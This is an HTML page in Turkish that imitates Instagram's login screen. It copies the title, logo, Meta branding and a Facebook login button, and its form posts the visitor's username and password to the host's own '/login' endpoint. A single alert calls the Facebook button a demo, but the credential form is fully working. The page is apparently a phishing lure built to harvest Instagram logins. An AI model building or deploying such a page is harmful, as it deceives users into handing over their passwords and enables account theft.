<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <style>
    body {
      background-color: black;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      color: white;
    }

    .container {
      width: 100%;
      max-width: 350px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo img {
      width: 175px;
      height: auto;
      margin-bottom: 30px;
    }

    .divider {
      width: 100%;
      text-align: center;
      border-bottom: 1px solid #262626;
      line-height: 0.1em;
      margin: 20px 0 30px;
    }

    .divider span {
      background: black;
      padding: 0 10px;
      color: #8e8e8e;
    }

    input {
      width: 100%;
      background-color: #121212;
      border: 1px solid #262626;
      border-radius: 5px;
      padding: 12px 10px;
      margin-bottom: 10px;
      color: white;
      font-size: 14px;
      box-sizing: border-box;
    }

    input::placeholder {
      color: #8e8e8e;
    }

    .login-btn, .action-btn {
      width: 100%;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 5px;
      padding: 14px 0;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }

    .facebook-btn {
      width: 100%;
      background-color: transparent;
      border: none;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 20px 0;
      cursor: pointer;
    }

    .facebook-icon {
      color: white;
      background-color: #0095f6;
      border-radius: 50%;
      width: 16px;
      height: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 8px;
      font-weight: bold;
      font-size: 12px;
    }

    .facebook-text {
      color: #0095f6;
      font-weight: 600;
      font-size: 14px;
    }

    .forgot-password, .signup {
      color: #0095f6;
      font-size: 12px;
      text-align: center;
      margin-top: 20px;
      text-decoration: none;
    }

    .signup {
      margin-top: 60px;
      color: #8e8e8e;
      font-size: 14px;
    }

    .meta {
      margin-top: 80px;
      text-align: center;
      color: #8e8e8e;
      font-size: 12px;
    }

    .meta-logo {
      margin-top: 10px;
    }

    .iframe-container {
      display: none;
      width: 100%;
      max-width: 350px;
      margin-top: 20px;
    }

    .iframe-container iframe {
      width: 100%;
      height: 400px;
      border: none;
      background-color: black;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="ig.jpg" alt="Instagram Logo">
    </div>
    
    <button class="facebook-btn" onclick="handleFacebookLogin()">
      <div class="facebook-icon">f</div>
      <span class="facebook-text">Facebook ile Devam Et</span>
    </button>
    
    <div class="divider">
      <span>YA DA</span>
    </div>
    
    <form id="login-form" action="/login" method="POST" onsubmit="return handleLogin(event)">
      <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
      <input type="password" name="password" placeholder="Şifre" required>
      <button type="button" class="action-btn" onclick="showIframe('forgot-password')">Şifreni mi unuttun?</button>
      <button type="submit" class="login-btn">Giriş yap</button>
    </form>
    
    <div class="signup">
      Hesabın yok mu? <button type="button" class="action-btn" onclick="showIframe('signup')">Kaydol</button>
    </div>
    
    <div class="iframe-container" id="iframe-container">
      <iframe id="iframe-content" src=""></iframe>
    </div>
    
    <div class="meta">
      from
      <div class="meta-logo">Meta</div>
    </div>
  </div>

  <script>
    function handleFacebookLogin() {
      alert('Facebook ile giriş yapılıyor... (Bu bir demo uyarısıdır)');
    }

    function handleLogin(event) {
      event.preventDefault();
      const form = document.getElementById('login-form');
      const username = form.querySelector('input[name="username"]').value;
      const password = form.querySelector('input[name="password"]').value;

      if (!username || !password) {
        alert('Lütfen tüm alanları doldurun.');
        return false;
      }

      // Submit form to server
      form.submit();
      return true;
    }

    function showIframe(type) {
      const iframeContainer = document.getElementById('iframe-container');
      const iframeContent = document.getElementById('iframe-content');
      iframeContainer.style.display = 'block';
      iframeContent.src = type === 'signup' ? 'signup.html' : 'forgot_password.html';
    }
  </script>
</body>
</html>
